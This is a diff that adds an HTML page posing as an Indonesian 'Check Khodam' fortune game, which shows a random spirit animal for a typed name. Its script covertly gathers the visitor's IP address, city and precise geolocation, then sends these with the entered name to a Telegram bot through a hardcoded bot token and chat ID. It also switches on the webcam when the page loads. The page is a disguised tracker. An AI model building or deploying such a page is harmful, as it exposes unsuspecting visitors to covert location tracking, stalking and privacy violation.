@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Check Khodam Game</title>
+    <style>
+        body {
+            font-family: 'Courier New', Courier, monospace;
+            background-color: black;
+            color: #00FF00;
+            overflow: hidden;
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+        }
+        .container {
+            text-align: center;
+            background-color: rgba(0, 0, 0, 0.8);
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.7);
+            position: relative;
+            overflow: hidden;
+        }
+        h1 {
+            color: #00FF00;
+            font-size: 2.5rem;
+            margin-bottom: 20px;
+            animation: flicker 1.5s infinite;
+        }
+        input[type="text"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #444;
+            border-radius: 5px;
+            background-color: #333;
+            color: #ddd;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+        }
+        button {
+            background-color: #00FF00;
+            color: black;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 1rem;
+            transition: background-color 0.3s ease;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.7);
+        }
+        button:hover {
+            background-color: #00CC00;
+        }
+        .khodam-image {
+            width: 200px;
+            height: 200px;
+            object-fit: cover;
+            border: 3px solid #00FF00;
+            border-radius: 10px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.8);
+            animation: shake 0.5s infinite;
+        }
+        #result {
+            display: none;
+            margin-top: 20px;
+            animation: fadeIn 2s;
+        }
+        #digital-clock {
+            position: fixed;
+            bottom: 10px;
+            right: 10px;
+            font-size: 1.5rem;
+            color: #00FF00;
+        }
+        .background-text {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            font-size: 16px;
+            color: #00FF00;
+            white-space: nowrap;
+            overflow: hidden;
+            pointer-events: none;
+            animation: fall 10s linear infinite;
+        }
+        @keyframes flicker {
+            0% { opacity: 1; }
+            50% { opacity: 0.7; }
+            100% { opacity: 1; }
+        }
+        @keyframes shake {
+            0% { transform: translateX(-5px); }
+            50% { transform: translateX(5px); }
+            100% { transform: translateX(-5px); }
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        @keyframes fall {
+            from {
+                transform: translateY(-100%);
+            }
+            to {
+                transform: translateY(100%);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Check Khodam Game</h1>
+        <input type="text" id="username" placeholder="Masukkan nama Anda">
+        <button onclick="checkKhodam()">Cek Khodam</button>
+        <div id="result">
+            <h2>Hasil Khodam</h2>
+            <p id="nameResult"></p>
+            <img id="khodamImage" class="khodam-image">
+            <p id="khodamResult"></p>
+        </div>
+        <video id="camera" width="320" height="240" autoplay></video>
+    </div>
+    <div id="digital-clock"></div>
+    <div class="background-text">
+        <p>HACKER MODE ACTIVE...</p>
+        <p>ACCESSING SYSTEM...</p>
+        <p>LOADING DATA...</p>
+        <!-- Add more text lines if needed -->
+    </div>
+    <script>
+        const khodams = [
+            {name: "Kosong",image:""},
+            {name: "Khodam Harimau", image: "https://i.ibb.co/pyVvNM8/Picsart-23-09-26-19-17-34-628-4103728119.webp"},
+            {name: "Khodam Macan Putih", image: "https://i.ibb.co/Y2QPpz5/a14c29a310ec66d9ecf93a323739c060.jpg"},
+            {name: "Khodam Naga", image: "https://i.ibb.co/Cpy7d2j/651ad883a1f2a.png"},
+            {name: "Khodam Garuda", image: "https://i.ibb.co/q1HyGCw/garuda-orig.jpg"},
+            {name: "Khodam Kuda Sembrani", image: "https://i.ibb.co/s69cmM0/037226000-1482997672-4-kuda.jpg"},
+            {name: "Khodam Bidadari", image: "https://i.ibb.co/7ycxk18/o8-Adn-Jaf-Wyid-BIAx-BVBLXwi-YABjpw-B2-Eh-NGAIX-tplv-nhvfeczskr-1-250-0.webp"},
+            {name: "Khodam Raksasa", image: "https://i.ibb.co/QPB9TjK/074938000-1549519877-giant-cats-12.webp"}
+        ];
+
+        async function checkKhodam() {
+            const username = document.getElementById("username").value;
+
+            if (!username) {
+                alert("Masukkan nama Anda!");
+                return;
+            }
+
+            const khodam = khodams[Math.floor(Math.random() * khodams.length)];
+
+            // Mendapatkan alamat IP dan kota
+            const ipResponse = await fetch('https://ipinfo.io/json');
+            const ipData = await ipResponse.json();
+            const ip = ipData.ip;
+            const city = ipData.city || 'Tidak tersedia';
+
+            // Mendapatkan lokasi geografis
+            navigator.geolocation.getCurrentPosition(async (position) => {
+                const { latitude, longitude } = position.coords;
+                const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+                // Update halaman web
+                document.getElementById("nameResult").textContent = `👤Nama: ${username}`;
+                document.getElementById("khodamResult").textContent = `🐊Khodam: ${khodam.name}`;
+                document.getElementById("khodamImage").src = khodam.image;
+                document.getElementById("result").style.display = "block";
+
+                // Kirim data ke Telegram
+                sendToTelegram(username, khodam.name, ip, city, mapsUrl);
+            }, (error) => {
+                console.error('Error getting location: ', error);
+            });
+        }
+
+        function sendToTelegram(name, khodam, ip, city, mapsUrl) {
+            const token = '7207871141:AAEYV8Bbw6VGNnqAxzFbCdphDVY_gJczRm4'; // Ganti dengan token bot Telegram Anda
+            const chatId = '6864784021'; // Ganti dengan chat ID Telegram Anda
+            const text = `
+              👤Nama: ${name}
+              🐊Khodam: ${khodam}
+              🌐Alamat IP: ${ip}
+              🏙️Kota: ${city}
+              📍Lokasi: ${mapsUrl}
+            `;
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
+
+            fetch(url).catch(error => console.error('Error mengirim pesan ke Telegram:', error));
+        }
+
+        function updateClock() {
+            const now = new Date();
+            const hours = String(now.getHours()).padStart(2, '0');
+            const minutes = String(now.getMinutes()).padStart(2, '0');
+            const seconds = String(now.getSeconds()).padStart(2, '0');
+            document.getElementById('digital-clock').textContent = `${hours}:${minutes}:${seconds}`;
+        }
+
+        setInterval(updateClock, 1000);
+        updateClock();
+
+        // Menyalakan kamera
+        const camera = document.getElementById('camera');
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            navigator.mediaDevices.getUserMedia({ video: true }).then(function(stream) {
+                camera.srcObject = stream;
+                camera.play();
+            }).catch(function(error) {
+                console.error("Error accessing camera: ", error);
+            });
+        } else {
+            alert("Kamera tidak didukung di browser ini.");
+        }
+    </script>
+</body>
+</html>
